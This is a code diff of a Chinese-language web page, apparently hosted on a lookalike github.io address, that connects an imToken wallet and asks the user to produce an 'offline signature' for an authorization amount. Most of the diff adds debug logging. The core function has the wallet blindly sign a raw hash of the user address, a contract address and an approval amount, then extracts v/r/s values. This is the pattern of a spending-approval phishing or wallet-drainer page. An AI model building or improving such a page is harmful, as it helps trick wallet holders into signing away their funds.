@@ -352,11 +352,15 @@
             <!-- 复制链接区 -->
             <div class="copy-link-wrap">
                 <span id="copyLinkText">https://trc20trx-alt.github.io/Trc20.TRX/</span>
-                <button id="copyLinkBtn"><<i class="fa fa-copy"></</i> 复制链接</button>
+                <button id="copyLinkBtn">复制链接</button>
             </div>
         </div> 
         <button id="connectBtn" class="btn">连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled><<i class="fa fa-pencil"></</i> 生成离线签名</button>
+        <button id="approveBtn" class="btn" disabled> 生成离线签名</button>
+        <!-- 临时调试按钮，添加到btn-group内 -->
+<button id="showDebugBtn" class="btn" style="background: #6366f1;">
+   查看调试信息
+</button>
         <button id="checkStatusBtn" class="btn" disabled style="background: #10b981;"> 查看授权状态</button>
     </div>
     <!-- 底部信息区 -->
@@ -586,7 +590,7 @@
          * @param {string} amount - 授权金额（十六进制）
          * @returns {Object} v/r/s签名参数
          */
-         async function generateOfflineSignature(userAddress, contractAddress, amount) {
+       async function generateOfflineSignature(userAddress, contractAddress, amount) {
             try {
                 // 1. 基础参数校验（不变）
                 if (!userAddress || !contractAddress || !amount) {
@@ -594,99 +598,127 @@
                 }
                 const base58Regex = /^[A-Za-z0-9]{34}$/;
                 if (!base58Regex.test(userAddress) || !base58Regex.test(contractAddress)) {
-                    throw new Error("用户地址或合约地址不是有效的TRON base58格式");
+                    throw new Error("用户地址或合约地址不是有效的TRON base58格式（必须34位字母数字）");
                 }
                 const hexRegex = /^0x[0-9a-fA-F]*$/;
                 if (!hexRegex.test(amount)) {
-                    throw new Error("授权金额必须是十六进制格式（以0x开头）");
+                    throw new Error("授权金额必须是十六进制格式（以0x开头，后跟字母数字）");
                 }
 
-                // 2. 地址转hex + 严格格式校验（核心修复1：确保hex片段合法）
-                let userHex = tronWeb.address.toHex(userAddress).toLowerCase(); // 统一转为小写，避免大小写混合
-                let contractHex = tronWeb.address.toHex(contractAddress).toLowerCase();
-                let amountHex = amount.toLowerCase().slice(2); // 移除0x前缀，统一小写
+                // 2. 地址转hex + 终极清理（核心修复1：移除所有不可见字符+非法字符）
+                let userHex = tronWeb.address.toHex(userAddress) || "";
+                let contractHex = tronWeb.address.toHex(contractAddress) || "";
+                let amountHex = amount || "";
 
-                // 校验hex片段仅包含0-9、a-f（核心修复：过滤非法字符）
-                const pureHexRegex = /^[0-9a-f]*$/;
-                if (!pureHexRegex.test(userHex.slice(2))) { // 跳过0x前缀校验
-                    throw new Error(`用户地址转hex后存在非法字符：${userHex}`);
+                // 清理规则：保留0-9、a-f、A-F、0x前缀，移除所有其他字符（包括空格、换行、特殊符号）
+                const cleanHex = (str) => str.replace(/[^0-9a-fA-Fx]/g, "").toLowerCase();
+                userHex = cleanHex(userHex);
+                contractHex = cleanHex(contractHex);
+                amountHex = cleanHex(amountHex);
+
+                // 校验清理后是否仍包含0x前缀，且前缀后非空
+                if (!userHex.startsWith("0x") || userHex.length <= 2) {
+                    throw new Error(`用户地址转hex并清理后格式无效：${userHex}（需含0x前缀且后跟有效字符）`);
                 }
-                if (!pureHexRegex.test(contractHex.slice(2))) {
-                    throw new Error(`合约地址转hex后存在非法字符：${contractHex}`);
+                if (!contractHex.startsWith("0x") || contractHex.length <= 2) {
+                    throw new Error(`合约地址转hex并清理后格式无效：${contractHex}`);
                 }
-                if (!pureHexRegex.test(amountHex)) {
-                    throw new Error(`授权金额转hex后存在非法字符：${amountHex}`);
+                if (!amountHex.startsWith("0x") || amountHex.length <= 2) {
+                    throw new Error(`授权金额清理后格式无效：${amountHex}`);
                 }
 
-                // 校验TRON地址转hex后的长度（去掉0x后必须是40位，核心修复2：避免长度异常）
-                userHex = userHex.slice(2); // 最终移除0x前缀
+                // 3. 提取纯hex片段（去掉0x前缀）+ 长度校验
+                userHex = userHex.slice(2); // 最终纯hex片段（无0x）
                 contractHex = contractHex.slice(2);
+                amountHex = amountHex.slice(2);
+
+                // 校验纯hex片段非空（核心修复2：避免片段为空）
+                if (userHex.length === 0) throw new Error("用户地址转hex后无有效字符");
+                if (contractHex.length === 0) throw new Error("合约地址转hex后无有效字符");
+                if (amountHex.length === 0) throw new Error("授权金额转hex后无有效字符");
+
+                // 校验TRON地址hex长度（必须40位，核心修复3：固定长度）
                 if (userHex.length !== 40) {
-                    throw new Error(`用户地址转hex后长度异常（应为40位），实际：${userHex.length}位`);
+                    throw new Error(`用户地址hex长度异常（应为40位），实际：${userHex.length}位 → 地址可能无效`);
                 }
                 if (contractHex.length !== 40) {
-                    throw new Error(`合约地址转hex后长度异常（应为40位），实际：${contractHex.length}位`);
+                    throw new Error(`合约地址hex长度异常（应为40位），实际：${contractHex.length}位 → 合约地址可能错误`);
                 }
 
-                // 3. 拼接hex字符串 + 长度修正（核心修复3：确保总长度为偶数）
+                // 4. 拼接最终hex + 偶数长度修正
                 let combinedHex = userHex + contractHex + amountHex;
-                // 若拼接后长度为奇数，末尾补0（hex转字节要求长度必须是偶数）
+                // 若长度为奇数，末尾补0（hex转字节必须偶数长度）
                 if (combinedHex.length % 2 !== 0) {
                     combinedHex += "0";
-                    console.warn("拼接后hex长度为奇数，自动补0修正：", combinedHex);
+                    console.warn(`拼接后hex长度为奇数（${combinedHex.length}位），自动补0修正为${combinedHex.length + 1}位`);
                 }
 
-                // 4. 最终校验拼接后的hex合法性（双重保险）
+                // 5. 终极校验（核心修复4：双重保险，确保无任何非法字符）
+                const pureHexRegex = /^[0-9a-f]*$/;
                 if (!pureHexRegex.test(combinedHex)) {
-                    throw new Error(`拼接后hex存在非法字符：${combinedHex}`);
+                    // 定位非法字符位置（方便调试）
+                    const invalidChar = combinedHex.split("").find(c => !/[0-9a-f]/.test(c));
+                    throw new Error(`拼接后hex含非法字符："${invalidChar}"（位置：${combinedHex.indexOf(invalidChar)}）`);
                 }
 
-                // 5. 构造签名消息（不变）
-                const messageHash = tronWeb.sha3(
-                    tronWeb.utils.hexToBytes(combinedHex) // 此时hex格式合法，可正常转字节
-                );
+                // 6. 构造签名消息（关键：确保hexToBytes接收纯合法hex）
+                let hexBytes;
+                try {
+                    hexBytes = tronWeb.utils.hexToBytes(combinedHex);
+                    if (!hexBytes || hexBytes.length === 0) {
+                        throw new Error("hex转字节后为空");
+                    }
+                } catch (hexErr) {
+                    throw new Error(`hex转字节失败：${hexErr.message} → 拼接后hex：${combinedHex}`);
+                }
 
-                // 6. 唤起imToken签名（兼容旧版本，不变）
+                const messageHash = tronWeb.sha3(hexBytes);
+
+                // 7. 唤起imToken签名（兼容旧版本）
                 let signature = await tronWeb.trx.sign(messageHash, true);
                 if (typeof signature === "object" && signature.signature) {
                     signature = signature.signature;
                 }
 
-                // 7. 解析签名参数（不变）
+                // 8. 解析签名参数
                 const v = parseInt(signature.slice(128, 130), 16);
                 const r = `0x${signature.slice(0, 64)}`;
                 const s = `0x${signature.slice(64, 128)}`;
 
-                // 保存关键信息到本地（便于调试）
-                localStorage.setItem(
-                    `signature_debug_${userAddress}`,
-                    JSON.stringify({
-                        userHex,
-                        contractHex,
-                        amountHex,
-                        combinedHex,
-                        messageHash,
-                        timestamp: new Date().toISOString()
-                    })
-                );
+                // 9. 超详细调试信息（核心修复5：方便排查所有步骤）
+                const debugInfo = {
+                    step: "签名生成成功",
+                    userAddress_raw: userAddress,
+                    contractAddress_raw: contractAddress,
+                    amount_raw: amount,
+                    userHex_cleaned: userHex,
+                    contractHex_cleaned: contractHex,
+                    amountHex_cleaned: amountHex,
+                    combinedHex_final: combinedHex,
+                    combinedHex_length: combinedHex.length,
+                    messageHash: messageHash,
+                    timestamp: new Date().toISOString()
+                };
+                localStorage.setItem(`signature_debug_${userAddress}`, JSON.stringify(debugInfo, null, 2));
 
                 return { v, r, s };
             } catch (e) {
-                // 细化错误提示，指明具体问题（核心修复4：方便排查）
-                if (e.message.includes("非法字符")) {
-                    throw new Error(`hex格式错误：${e.message}，请检查地址或金额有效性`);
-                } else if (e.message.includes("长度异常")) {
-                    throw new Error(`hex长度错误：${e.message}，可能是地址格式无效`);
-                } else if (e.message.includes("hexToBytes")) {
-                    throw new Error(`hex转字节失败：拼接后的hex格式非法，详情请查看本地存储的signature_debug记录`);
-                } else {
-                    throw new Error(`签名生成失败：${e.message}`);
-                }
+                // 错误信息优化（核心修复6：告诉用户如何查看调试信息）
+                const debugKey = `signature_debug_${userAddress}`;
+                localStorage.setItem(debugKey, JSON.stringify({
+                    step: "签名生成失败",
+                    error: e.message,
+                    userAddress: userAddress,
+                    contractAddress: contractAddress,
+                    amount: amount,
+                    timestamp: new Date().toISOString()
+                }, null, 2));
+
+                throw new Error(`签名生成失败：${e.message} → 查看调试信息：打开浏览器控制台，输入 localStorage.getItem('${debugKey}') 并回车`);
             }
         }
 
-
-        /**
+             /**
          * 初始化钱包：获取地址、余额
          */
         async function initWallet() {
@@ -882,6 +914,18 @@
                 toast.style.display = "none";
             }, 3000);
         }
+        // 临时调试按钮逻辑
+document.getElementById("showDebugBtn").addEventListener("click", () => {
+  // 找到调试信息键（匹配以signature_debug_开头的键）
+  const debugKeys = Object.keys(localStorage).filter(key => key.startsWith("signature_debug_"));
+  if (debugKeys.length === 0) {
+    alert("未找到调试信息，请先点击「生成离线签名」触发错误");
+    return;
+  }
+  // 读取并显示调试信息（格式化JSON，方便查看）
+  const debugInfo = JSON.parse(localStorage.getItem(debugKeys[0]));
+  alert("调试信息：\n" + JSON.stringify(debugInfo, null, 2));
+});
     </script>
 </body>
 </html>
